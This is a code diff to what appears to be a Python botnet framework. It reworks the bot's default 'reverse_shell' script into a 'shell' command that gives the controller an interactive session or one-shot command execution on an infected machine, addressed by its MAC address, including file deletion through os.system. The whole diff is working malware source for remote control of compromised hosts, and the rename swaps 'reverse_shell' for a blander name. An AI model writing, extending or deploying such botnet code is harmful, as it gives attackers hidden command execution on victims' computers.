@@ -8,15 +8,25 @@ from .. import BotNet, Request
 
 
 @BotNet.default_script(script_version="0.0.1")
-def reverse_shell(request: Request) -> str:
-    """reverse shell
+def shell(request: Request, *cmd_args) -> str:
+    """
+    `[mac-address] shell` -> shell session
+    or 
+    `[mac-address] shell [command]`-> run command and exit
 
-    `[system-mac-address] reverse_shell`
-
-    example input command: `94945035671481 reverse_shell`\n
-    return: shell session"""
-
+    example input command:
+         `94945035671481 shell`  \n 
+         `94945035671481 shell ls .`\n
+         `94945035671481 shell ping google.com -c 10`
+"""
     engine = request.engine
+
+    if not len(cmd_args) == 0:
+        res = _cmd(cmd_args, engine, timeout=10)
+        if not res == None:
+            engine.send(res)
+        return
+
     repeat = 0
     time_out = 500
     sleep_time = 2
@@ -40,7 +50,7 @@ def reverse_shell(request: Request) -> str:
             break
 
         else:
-            res = cmd(command, engine, timeout=10)
+            res = _cmd(command, engine, timeout=10)
             if not res == None:
                 engine.send(res)
             engine.send(f"{os.getcwd()}=>")
@@ -91,16 +101,16 @@ def _cd(command:list[str]) -> str:
         return error
 
 
-def cmd(command:list[str], engine, timeout:int=10):
-    """Runs cmd commands."""
+def _cmd(command:list[str], engine, timeout:int=10):
+    """Run commands."""
 
-    if command[0] in ["ls", "dir"]:
+    if command[0] in ("ls", "dir"):
         return _ls(command)
 
     elif command[0] == "cd":
         return _cd(command)
 
-    elif command[0] in ["mkdir", "touch", "rm", "rmdir"]:
+    elif command[0] in ("mkdir", "touch", "rm", "rmdir"):
         os_result = os.system(" ".join(command))
         return f'output code "{os_result}"'
 
